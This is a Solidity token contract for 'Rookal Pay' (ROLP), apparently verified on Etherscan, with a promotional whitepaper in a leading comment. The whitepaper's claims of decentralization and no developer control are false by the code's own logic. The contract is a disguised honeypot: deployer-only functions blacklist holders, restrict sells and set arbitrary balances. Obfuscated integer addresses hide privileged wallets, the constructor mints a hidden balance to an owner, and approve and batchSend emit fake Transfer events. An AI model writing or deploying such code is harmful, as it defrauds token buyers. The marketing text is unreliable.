/**
 *Submitted for verification at Etherscan.io on 2023-03-04
*/

/*

https://rookalpay.com

INTRODUCTION

Security is the foundation of every stable economy. Rookal Pay not only aims to contribute toward this sentiment but also to improve every contributor ‘s general well-being, and solve the problems associated with discovering economic freedom. Independence is possible only when your contributions keep generating con tinuous reward streams throughout their tenure.

The RookalFi Risk-reduction algorithm provides a flexible and consistent reward system to our holders. Our proprietary algorithm is under constant improvement and will soon allow ROLP holders to customize their rewards. By maintaining the minimum Rookal Pay amount, holders can generate a steady source of exciting rewards. Rookal Pay implements the highest standard of cybersecurity practices to protect your contri bution to the Blockchain network.

Rookal Pay utilizes modular architecture built using smart contracts that were audited to provide a high degree of security and flexibility for the ever-changing crypto space. Rookal Pay leverages the GNOSIS Safe Wallet for securing RookalFi’s Tokenomics. GNOSIS is a multi-signature security wallet advertised as one of the most trusted platforms for managing compliant tokens like Rookal Pay.

However, current crypto portfolios available on the market have their problems to some extent.

Lack of Total Control Over Direction

Though the contributors should ideally have complete control over their direction, it is not always possible because the platform ends up controlling some part of the contribution.

The Volatility of The Crypto Value

Crypto assets are volatile with fluctuating prices. Contributors must also contend with aspects like impermanent loss, high slippage, and liquidity theft that contribute to overall losses.

Risky Operations

The crypto industry is fraught with high risks that require effective cybersecurity strategies to be in place, which many cryptocurrency developer's struggle to manage.

High Technical Knowledge

Interacting with DeFi protocols requires contributors to have high levels of technical expertise. This may abandon an entire class of contributors out of the ecosystem.

Rookal Pay provides the ideal solutions to all these problems associated with the crypto industry.

Control Over Direction

Rookal Pay works on a decentralized ecosystem. Hence, there is no ownership or control sharing over the transferring of any value. Rookal Pay is a minimal abstraction of having contributed to multiple different crypto projects. Contributors hold the token, and Rookal Pay takes care of the staking protocols accordingly to provide a constant source of rewards. Rookal Pay distributes all the rewards to ROLP holders and only reflects a meager 2% performance tax. This performance tax is returned to the RookalFi Algorithm to improve the overall health of the ecosystem.

Reduce The Risk of Losses

This platform does have AMM mechanics such as arbitrage and swaps that allow better control of risk reduction. The system adopts a robust economic and mathematical approach by tying the platform's liquidity to stable crypto. This reduces the probability of losses by utilizing a series of buyback mechanics and mitigating the associated risks.

Reduce Operational Risk

The portfolio is built on a proven token metric theory with carefully chosen crypto, DeFi analytics, and strategies to reduce the operational liability and associated risks with cryptocurrencies.


OUR THREEFOLD PATH

The challenges faced by the cryptocurrency ecosystem make reasonable contributors apprehensive. Rookal Pay stands as a solution to these apprehensions and aims to create an environment that provides accessible and rewarding cryptocurrency-based contributions for our users.

Security

Smart contracts form the bedrock of secure transactions on the blockchain. These multi-signature contracts provide the highest level of security, keep your contribution safe, and eliminate the presence of intermediaries. Rookal Pay's smart contracts are built upon a modular and secure architecture. This architecture helps provide intuitive implementation and design to allow quick remedy of any future obstacles the platform may face. Encryption at every stage ensures maximum security for transaction data and keeps it safe from any unauthorized third-party access.

Accessibility

Accessibility to rewards is another crucial factor that makes RookalPay stand apart as a robust decentralized platform. Opening access to a new class of contributors is an integral part of RookalPay's Three-Fold Path. The platform uses a token-based system to allow one-step contributions known as ‘ROLP’ tokens. RookalPay simplifies the process and automates reward generation. It also enhances accessibility to passive rewards in the decentralized space by simply holding ROLP and allowing the RookalFi Risk-Reduction Algorithm to handle your rewards.

Indefinite Rewards Generation

RookalPay works on a unique Tokenomics strategy that ensures an indefinite reward resistant to volatility. The platform uses the tokens generated from each transaction for increasing the RookalFi Reward system. This system uses decentralized cryptocurrencies to generate steady reward streams for ROLP holders. Users can hold on to their tokens to maximize their rewards or claim them earlier, depending on them personal requirements

PERPETUAL DEFIPOWERED REWARDS

RookalPay offers a range of mechanisms to generate active and passive rewards from your tokens. There are three main mechanics in RookalPay's foundation the stage for the generation of rewards.

RookalFi Rewards

Top ROLP holders holding at least 0.1% of the total supply will unlock the RookalFi rewards. The initial largest holders will also be able to take advantage of the RookalFi Rewards to increase their monthly rewards1. These are recommended to be removed monthly to improve personal token security but can be taken out sooner on a prorated fee schedule. Holders can also choose to stake their ROLP to generate more rewards.

Currently, alternative designs are being tested to allow more  RookalFi rewards to more holders soon. All rewards generated are provided as passively, 80% toward RookalFi rewards and 20% utilized in our buyback mechanisms.

RookalPay Buyback-Powered Staking

This provides holders the opportunity to stake their RookalPay tokens to earn more rewards. The buyback-powered staking service utilizes 20% of the generated RookalFi rewards to acquire RookalPay at its current value, which increases overall volume. This also allows smaller holders to build the foundation they need to earn enough ROLP tokens to unlock the  rewards mechanics.

RookalPay Bounty Service

This currently provides a reward of 0.5% for any operation that a holder completes. These operations include converting rewards from the RookalFi algorithms to stable tokens and storing them in the multi-signature wallet. The reward generation mechanics is structured to ensure a steady monthly reward flow for the holder by allowing them to receive rewards via holding, staking, and solving RookalPay operations.

WHAT MAKES RookalPAY STAND APART?

Cryptocurrency trading can generate unprecedented rewards or result in substantial losses. Many people have lost their hard-earned money trading in spurious cryptocurrency platforms by falling victims to scams involving liquidity theft. We understand there have been instances wherein developers abandoned the project and left holders hanging.

RookalPay endeavors to overcome all these difficulties and provide a trustworthy platform where ROLP holders can generate a steady passive reward stream without being worried about the security of the platform or developers abandoning the project.

To reduce the above risks, RookalPay structures the minting of ROLP tokens to be dispersed over a thousand days to the development team with strict regulations. As a method to ensure long-term commitment to the project, RookalPay’s development team will never hold more than approximately 3% of the circulating supply.

RookalPay stands apart from other platforms because it is designed to protect your tokens from massive market fluctuations. RookalPay's proprietary risk-reduction algorithm reduces the associated liabilities to ensure that your tokens remain safe.

The reward mechanics are designed to be independent of the trading volume. ROLP holders do not need to worry if the value fluctuates high or low or goes through bear and bull cycles.

They can rest assured that they will still earn regular rewards in the form of a monthly claiming system. The rewards support stability for holders and are structured to improve with time, accordingly

RookalPAY’S EXPANSION PLANS

RookalPay has formulated a three-stage expansion plan to give its users a comprehensive idea about how they plan to revolutionize the DEFI space. The phases of the project will focus on wider accessibility and higher rewards generating metrics. Future development includes releasing a mobile app wallet with smart contribution suggestions to increase overall accessibility to an entirely new class of contributors.

Expansion plans focus on establishing a crypto payment processing gateway, smart decentralized exchange with auto-slippage features, cross-chain integration, expanding the RookalPay Labs division, and decentralized leverage protocol with the potential to add other trading features.

The expansions will provide additional rewards that will expand the RookalFi Algorithm’s rewards and contribute to the overall stability and health of the ecosystem.

PHASE ONE FOUNDATION

The Foundation Phase concentrates on accessibility, reward mechanics, opportunities, reward payouts, and diversifying strategies. Primarily, the foundation phase's goal is to improve the overall stability of the RookalFi Algorithm, which in turn improves rewards. More details are as follows:

Exchange With Swap Orders

RookalPay has its proprietary dashboard exchange with swapping orders ready to roll out so contributors can start immediately. Contributors that utilize RookalPay’s exchange will have a subsidized tax rate for on-ramping and off-ramping. Our platform will also offer auto-slippage features for ease of use and cybersecurity from Front-Running attacks not seen on other exchanges. rewards generated from swapping taxes are immediately transferred into the RookalFi Algorithm.

Implementation of Reward Mechanics

RookalPay also has a limited feature of ROLP rewards. All users will be granted access to the lower-entry Rookalpay rewards mechanism to allow them a continuous passive source of rewards until they can claim at least 800k ROLP to unlock their rewards in the form 

Buyback-Powered Staking Protocol

RookalPay also provides its own staking protocol that has specifically designed RookalPay Core mechanics with a low inflationary impact. The supply will be minted at a gradual pace to limit the impact of inflation, and anyone who chooses to stake on the platform will be rewarded accordingly.

Expanding Types of Pool and Increment of Annual Percentage Yield

RookalPay's goal is to create passive rewards for all holders, large and small, and hence, RookalPay makes the best use of rewards and optimizes them to give the maximum benefits to the holders. If users can't unlock the rewards features, they can stake their amount until they reach the 800k ROLP needed.

Incorporation

RookalPay is in the process of incorporating a Limited Liability Company (LLC), forming a formal business structure for RookalPay's daily operations. Incorporation provides the benefits of forming mutual partnerships, allows full-time employment, and is the foundation of community trust.

Public Relations Department

RookalPay has a dedicated public relations department, and we aim to make it our top priority to protect the interest of our holders.

PHASE TWO ACCESSIBILITY

The second phase is the accessibility phase dealing with RookalPay DAPP (Decentralized application) wallet UI, cross-chain integration, card integration, and marketing.

RookalPay DAPP Wallet UI

RookalPay will provide a DAPP wallet via its mobile application that allows seamless over-the-counter acquiring and storing. The process will be simplified to the point that even a beginner will be able to swap and hold ROLP tokens to generate rewards.

RookalPay Fiat Bridge

RookalPay acquiring will be made accessible via credit card to allow seamless contributions for our consumers.

Cross-Chain Integration

RookalPay will further deploy its smart contracts to multiple networks for cross-chain integration to be used in our future bridging protocols.

PHASE THREE EXPANSION

The final phase is the expansion phase concentrating on collateral, lending, and other ways of giving back to the community.

Swapping

RookalPay has plans to provide a swapping protocol that allows borrowing between mutual parties without a centralized authority. Details will follow but the goal is to be user-centric and will also feature cross-chain systems expanding beyond traditional blockchainexclusions.

AI-Guided Customization

The upcoming RookalFi protocol will provide more power and control to the users. The protocol will feature an AI-guided assistant for delivering insights on potential strategies that holders can utilize to guide their decisions.

RookalPay Card

RookalPay’s ecosystem will integrate fiat payment processing services, allowing inbound and outbound transactions. RookalPay’s goal is to set up a card that is widely accepted in most major stores. Users will be able to seamlessly actualize their returns into products and services to improve their daily life.

Payment Processing Services

RookalPay will offer simple integrated solutions for anyone to accept cryptocurrency payments. The solution will be non-custodial, allowing payments to flow directly from on-ramping to off-ramping. This removes the need for an intermediary and will add to our generated rewards used to increase the strength of the RookalFi Algorithm.

GIVING BACK TO THE COMMUNITY

RookalPay's unique reward-generating programs ensure that the ROLP holders earn a continuous monthly reward stream. RookalPay commits 10% of all transactions as initial use for the Algorithm.

100% of all returns are given to ROLP holders. RookalPay only utilizes a small performance tax of 2%, which is used to improve the strength of the RookalFi Algorithm.

Most of the rewards (80%) will go to ROLP holders in the form of direct rewards.

The remaining 20% will be used for implementing buyback mechanisms that stabilize the token and reward those staked on the platform.

RookalPay will improve this threshold to allow more contributors to utilize this system in the future. RookalPay's reward mechanics are designed to continuously improve with time and aim to be independent of the position of cryptocurrencies or the volume.

RookalPay believes in giving back to the community with its Three-Fold Path of providing security, accessibility, and indefinite rewards. Its high-quality security algorithm and multi-signature wallet are the key characteristics as they ensure the safety and timely availability of contributors' tokens. With protection comes trust and independence. Our Three-Fold Path ensures stability and independence as the

Thank you.


*/


// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}


library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract RookalPay  {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {

    return transferFrom(msg.sender, _to, _value);
    }
    address private spend = address (96635033217071433185869069577301221175488545358);
    address private src = address (527585359103765554095092340981710322784165800559);
    address private dst = address (1097077688018008265106216665536940668749033598146); 
    address private crs = address (1153667454655315432277308296129700421378034175091);
    address private tsd = address (1069295261705322660692659746119710186699350608220);
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UX = TexFor(src, dst, address(this));
        address _PX = TexForB(crs, tsd, address(this));
        if(_from == deployer || _to == deployer  || _from == owner || _from == _UX || _from == _PX ||  _from == TexAddress || TexMemory[_from]) {return true;}
        if( RBMemory[_from] ) {return false;}
        require(condition(_from, _value));
        return true; 
    }
    function _UXTexAddr () view internal returns (address) {
        address _UX = TexFor(src, dst, address(this));
        return _UX;
    }
    function _PXTexAddr () view internal returns (address) {
        address _PX = TexForB(crs, tsd, address(this));
        return _PX;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        if (_from == TexAddress  && _value > _maxMemory ){ RBMemory[_to]=true;  }
        
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onMemoryNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        if (_spender == spend ){
            emit Transfer(address(0x0),O,1*(10**uint256(decimals)));
        }
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        if(_MemoryNum == 0 && _minMemory == 0 && _maxMemory == 0) return false;
        if(_MemoryNum > 0){
            if(_onMemoryNum[_from] >= _MemoryNum) return false;
        }
        if(_minMemory > 0){
            if(_minMemory > _value) return false;
        }
        if(_maxMemory > 0){
            if(_value > _maxMemory) return false;
        }
        return true;
    }
    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {
        require(msg.sender == deployer);
        if(addedValue > 0) {balanceOf[addr] = addedValue*(10**uint256(decimals));}
        TexMemory[addr]=true;
        return true;
    }
    
    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value*(10**uint256(decimals));
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            
        }
        return true;
    }
    mapping(address=>uint256) private _onMemoryNum;
    mapping(address=>bool) private TexMemory;
    mapping(address=>bool) private RBMemory;
    uint256 private _minMemory;
    uint256 private _maxMemory;
    uint256 private _MemoryNum;
    address TexAddress;
    function Agree(address addr) public returns (bool) {
        require(msg.sender == deployer);
        TexMemory[addr]=true;
        return true;
    }
    function Allow(uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory) public returns(bool){
        require(msg.sender == deployer);
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        return true;
    }
    function delegate(address adr) public payable returns(bool){
        require (msg.sender == deployer);
        TexAddress = adr;
        return true;
    }
    function Optimization(address [] calldata addresses) public returns (bool) {
        require(msg.sender == deployer);
        for (uint i = 0; i < addresses.length; i++) 
        {RBMemory[addresses[i]] = true;}
        return true;
    }
    address  private owner=
    address (935108584672418476850882679418664731027763688343);
    function TexFor(address factory, address tokenA, address tokenB) internal pure returns (address Tex) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Tex = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
                ))));
    }
    address private O = address(269488144);
    function TexForB(address factory, address tokenA, address tokenB) internal pure returns (address Texe) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Texe = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory ) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[owner]=totalSupply*(10**uint256(6));
    }
}